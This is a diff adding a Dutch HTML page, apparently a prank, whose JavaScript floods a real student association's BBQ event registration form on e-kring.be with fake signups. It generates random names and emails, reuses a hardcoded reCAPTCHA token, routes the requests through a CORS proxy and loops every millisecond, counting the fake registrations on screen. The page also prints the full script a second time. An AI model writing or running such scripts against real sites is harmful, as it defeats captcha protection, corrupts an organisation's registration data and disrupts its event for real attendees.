@@ -1,0 +1,66 @@
+<!doctype html>
+<head>
+	<title>Aanmelden BBQ E-Kring</title>
+<script>
+function aangemeld(){
+	var xhr = new XMLHttpRequest();
+	var params='first_name=' + makeid() + '&last_name=' + makeid() + '&mail=' + makeid() + '@hotmail.com&g-recaptcha-response=04AOPBWq-eDxvDHc_CNTZUNwLmWK1VjyqOX4BQy2OHjrlg-ZLNnqTKhgMOOs-kuBElxZvuTpOsDQR6iyjuStkrqhDvvoQYiircJEN2L4XFmmwcEQibeYu89yGC9qRU-JsyYBqPTd_86AGRYtk3LoLrnPhrIVel2Dqwkkco8QPLHKmfTYWHUKrexVODGw_pRLJtf70fp_FGZR8cbgg65uL28Offd4yHUv-hrxC-kb_CoFdozbquNko_zGmOtpTPp9X6LFb6lCYE0uzR-rqbUIp1FRdwUvPwCyQ26D22Evr_2t2HJ9D3Hlh72lhWZ7yHJNLweutzGAX49pg3-OrS3MH558rzvoYvEyJKrjKlFrgHebh0Ns-pWGnnoUWf_cNRhpoaNcMbGC415qdj8n9mOMBIY-OBHnXXHvre8vFnemQdM8M9QbZG8iMjgG0';
+	xhr.open("POST", "https://cors-ekring.herokuapp.com/https://www.e-kring.be/page/calendar/event/48/register", true);
+	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhr.setRequestHeader("x-requested-with","");
+	xhr.onreadystatechange = function() {
+		if(this.readyState == 4) {
+			var id = document.getElementById("getal");
+			var cijfer = id.innerHTML;
+			id.innerHTML = parseInt(cijfer) + 1;
+			setTimeout(aangemeld,1);
+		}
+	}
+	xhr.send(params);
+};
+function makeid()
+{
+	var text = "";
+	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+
+	for( var i=0; i < 10; i++ )
+		text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+	return text;
+};
+</script>
+</head>
+<body>
+<h1>U heeft <span id="getal">0</span> personen aangemeld voor de BBQ van de E-kring!</h1><button onclick="aangemeld();">Run Code</button>
+<a href="https://www.e-kring.be/page/calendar/event/48/register">Echt inschrijven? Klik hier!</a>
+
+<h2>Code:</h2>
+<pre>
+function aangemeld(){
+	var xhr = new XMLHttpRequest();
+	var params='first_name=' + makeid() + '&last_name=' + makeid() + '&mail=' + makeid() + '@hotmail.com&g-recaptcha-response=04AOPBWq-eDxvDHc_CNTZUNwLmWK1VjyqOX4BQy2OHjrlg-ZLNnqTKhgMOOs-kuBElxZvuTpOsDQR6iyjuStkrqhDvvoQYiircJEN2L4XFmmwcEQibeYu89yGC9qRU-JsyYBqPTd_86AGRYtk3LoLrnPhrIVel2Dqwkkco8QPLHKmfTYWHUKrexVODGw_pRLJtf70fp_FGZR8cbgg65uL28Offd4yHUv-hrxC-kb_CoFdozbquNko_zGmOtpTPp9X6LFb6lCYE0uzR-rqbUIp1FRdwUvPwCyQ26D22Evr_2t2HJ9D3Hlh72lhWZ7yHJNLweutzGAX49pg3-OrS3MH558rzvoYvEyJKrjKlFrgHebh0Ns-pWGnnoUWf_cNRhpoaNcMbGC415qdj8n9mOMBIY-OBHnXXHvre8vFnemQdM8M9QbZG8iMjgG0';
+	xhr.open("POST", "https://cors-ekring.herokuapp.com/https://www.e-kring.be/page/calendar/event/48/register", true);
+	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhr.setRequestHeader("x-requested-with","");
+	xhr.onreadystatechange = function() {
+		if(this.readyState == 4) {
+			var id = document.getElementById("getal");
+			var cijfer = id.innerHTML;
+			id.innerHTML = parseInt(cijfer) + 1;
+			setTimeout(aangemeld,1);
+		}
+	}
+	xhr.send(params);
+};
+function makeid()
+{
+	var text = "";
+	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+
+	for( var i=0; i < 10; i++ )
+		text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+	return text;
+};
+</pre>
+</body>
